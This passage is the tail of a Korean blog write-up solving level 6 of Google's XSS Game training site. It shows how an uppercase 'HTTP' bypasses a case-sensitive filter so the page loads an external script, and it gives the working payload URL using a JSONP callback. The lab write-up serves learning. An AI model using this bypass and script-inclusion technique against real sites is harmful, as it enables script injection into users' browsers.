&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>script 소스코드를 살펴보니 아래와 같은 매커니즘으로 동작하고 있었다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">1. URL에서 <span style="color:#6272a4"># 뒤의 값을 가져와 url 변수에 저장</span>  
2. url 변수에서 https:// 형태의 값이 있는지 검사  
3. 만약 https:// 형태의 값이 있을 경우, Sorry, cannot load a URL containing <span style="color:#f1fa8c">&#34;http&#34;</span> 출력하고 종료  
4. 필터링을 통과 할 경우 해당 url에 있는 script 코드를 그대로 load  
</code></pre></td></tr></table>
</div>
</div><p>따라서 외부의 링크에서 악성 스크립트 코드를 생성 해 # 뒤에 넘겨주면 이를 그대로 실행 해 준다.
이 때 <code>http://</code> 혹은 <code>https://</code>에는 필터링이 있으므로 외부의 악성 스크립트 코드 주소에서 해당 값은 없어야 한다.</p>
<p>필터링을 하는 부분을 잘 살펴보면, 정규표현식의 형태로 되어있다.
그런데 소문자에 대해서는 필터링이 있지만, http중 한 글자라도 대문자가 있으면 필터링에 걸리지 않는다.
이에 외부의 링크에서 alert 창을 띄울 수 있는 script 코드를 구현한 후, <code>http</code> 대신 대문자로 <code>HTTP</code>를 사용 해 # 뒤에 넘겨주면 된다.
먼저 alert를 띄울 수 있는 스크립트 코드를 <code>test.js</code>라는 이름으로 아래와 같이 구현했다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">alert(<span style="color:#bd93f9">1</span>);
</code></pre></td></tr></table>
</div>
</div><p>이 후 # 뒤에 <code>HTTP://내서버의주소/test.js</code>를 전달 해 주었는데, 제대로 작동하지 않았다.
<code>Sorry, I can't navigate the frame to that URL</code> 이라는 alert 창만 떴다.</p>
<p>그래서 이 문제는 힌트를 참고하게 되었다.
4번째 힌트를 보면 아래와 같은 내용이 있다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">4. If you can&#39;t easily host your own evil JS file, see <span style="color:#ff79c6">if</span> google.com/jsapi?callback<span style="color:#ff79c6">=</span>foo will <span style="color:#8be9fd;font-style:italic">help</span> you here.
</code></pre></td></tr></table>
</div>
</div><p>힌트에 따라 <code>google.com/jsapi?callback=foo</code>에 접속 해 보았더니 코드가 있었다.
그런데 하단에 아래와 같이 <code>foo()</code> 함수를 호출하는데, 이때 foo는 <code>callback</code>의 값으로 넘어간 값이었다.</p>
<p><img src="/images/xssgame/xssgame_16.PNG" alt=""></p>
<p>이에 <code>foo</code> 대신 <code>alert</code>를 넘겨주면 소스코드의 하단에서 <code>foo();</code> 대신 <code>alert();</code>를 호출하지 않을까 싶어 <code>alert</code>를 넘겨주어 보았다.</p>
<p><img src="/images/xssgame/xssgame_17.PNG" alt=""></p>
<p>예상대로 <code>alert();</code>를 호출하게 된다.
이에 해당 URL에서 <code>http://</code>를 대문자로 바꾸어 문제의 # 뒤에 전달 해 주었다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">http://xss-game.appspot.com/level6/frame#HTTPS://www.google.com/jsapi?callback<span style="color:#ff79c6">=</span>alert
</code></pre></td></tr></table>
</div>
</div><p>그 결과 드디어 마지막 문제를 풀 수 있었다.</p>
<p><img src="/images/xssgame/xssgame_18.PNG" alt=""></p>
<hr>
<p>이렇게 6단계의 문제를 모두 풀 수 있었다.</p>
<p><img src="/images/xssgame/xssgame_19.PNG" alt=""></p>
<p>마지막 문제에서 어떤 부분 때문인지, 이론상으론 될 것 같은데 문제가 풀리지 않아 오래 고민을 했다.
그런데 문제를 다 푼 다음에 도대체 왜 안되는지를 모르겠어서, 처음에 시도한 방법을 다시 해 보았더니 이번엔 문제가 풀렸다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">http://xss-game.appspot.com/level6/frame#HTTP://내서버의주소/test.js
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/xssgame/xssgame_20.PNG" alt=""></p>
<p>기준이 따로 있는건지 뭔지 모르겠다.
어찌됬든 6문제 모두 CLEAR!</p></section>
    <footer>
    <div class="tags">
        
        <a href="https://mingzz1.github.io//tags#Write-up">#Write-up</a>
        
        <a href="https://mingzz1.github.io//tags#XSS%20Game">#XSS Game</a>
        
    </div>
</footer>
</article>

<div class="comments">
    <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_shortname = 'mingzzis-blog';
    (function () {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
</div>

<div id="post-nav">
    <div id="previous-post" class="post-nav-post">
        
        <p>Previous post</p>
        <a href="https://mingzz1.github.io/wargame/pwnable.kr/2018/05/30/pwnable.kr-mistake.html/">[Pwnable.kr] Toddler&#39;s Bottle - mistake 문제풀이</a>
        
    </div>

    <div id="next-post" class="post-nav-post">
        
        <p>Next post</p>
        <a href="https://mingzz1.github.io/ctf/2018/2018/07/17/meepwn2018-writeup.html/">[MeePwn2018] WHITE SNOW, BLACK SHADOW / ESOR / EZCHALLZ Write up</a>
        
    </div>
</div>


    </div>
    <ul class='social'>
    
    <li>
        <a href="https://github.com/mingzz1" class="icon alt" target="_blank">
            <i class="fa fa-github fa-2x"></i>
        </a>
    </li>
    
    <li>
        <a href="https://www.linkedin.com/in/minji-kim-12986a145/" class="icon alt" target="_blank">
            <i class="fa fa-linkedin fa-2x"></i>
        </a>
    </li>
    
</ul>
<footer class="site-footer">
    <p ckass="text">Powered by <a href="https://mingzz1.github.io" target="_blank">mingzzi</a> with <a
            href="https://skye3133.github.io/" target="_blank">myund</a></p>
</footer>

    <script id="dsq-count-scr" src="//mingzzis-blog.disqus.com/count.js" async></script>

    
<script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-130304424-1']);
    _gaq.push(['_trackPageview']);
    (function () {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
</script>
    
</body>
</body>

</html>